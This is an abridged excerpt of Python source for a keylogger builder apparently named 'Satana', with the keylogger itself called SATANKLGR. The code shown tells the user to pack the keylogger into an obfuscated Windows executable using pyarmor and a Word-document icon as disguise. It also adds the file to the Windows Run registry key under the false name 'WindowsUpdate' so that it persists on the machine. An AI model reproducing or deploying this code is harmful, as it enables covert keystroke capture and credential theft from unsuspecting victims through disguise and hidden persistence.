...
def bye():
    print()
    print(Fore.RED + "Satana says 'bye' to you!")
    print()
...
def pyw_exe():
    try:
        ...
        if os.name == "nt":
            ...
            print()
            print(Fore.YELLOW+f"""[*] Then if you need .exe file for Windows. Go to the Windows system.
            ~ pip3 install pyinstaller
            ~ pip3 install pyarmor
            ~ pyarmor pack --clean -e "--onefile --icon word.ico" SATANKLGR.py
            And eventually you will get a keylogger specially for Windows systems""")
            print()
    except:
...
def AddToRegistry():
   ...
   s_name1="SATANKLGR.exe"
   address1=os.path.join(pth1,s_name1)
   key1 =HKEY_CURRENT_USER
   key_value1 ="Software\Microsoft\Windows\CurrentVersion\Run"
   open=reg.OpenKey(key1,key_value1,0,reg.KEY_ALL_ACCESS)
   reg.SetValueEx(open,"WindowsUpdate",0,reg.REG_SZ,address1)
   reg.CloseKey(open)
AddToRegistry()
